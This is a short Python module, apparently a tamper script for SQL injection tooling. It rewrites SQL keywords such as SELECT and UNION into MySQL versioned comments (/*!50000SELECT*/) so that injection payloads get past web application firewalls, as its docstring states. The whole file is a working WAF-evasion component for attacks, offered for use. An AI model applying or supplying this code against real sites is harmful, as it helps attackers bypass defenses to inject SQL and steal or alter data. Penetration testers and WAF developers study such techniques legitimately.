"""Wrap SQL keywords in MySQL versioned comments, e.g. SELECT -> /*!50000SELECT*/,
which many WAFs fail to normalize before pattern matching."""

import re

KEYWORDS = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "WHERE", "FROM"]
_pattern = re.compile("|".join(rf"\b{k}\b" for k in KEYWORDS), re.IGNORECASE)


def _wrap(match: re.Match) -> str:
    return f"/*!50000{match.group(0)}*/"


def apply(payload: str) -> str:
    return _pattern.sub(_wrap, payload)
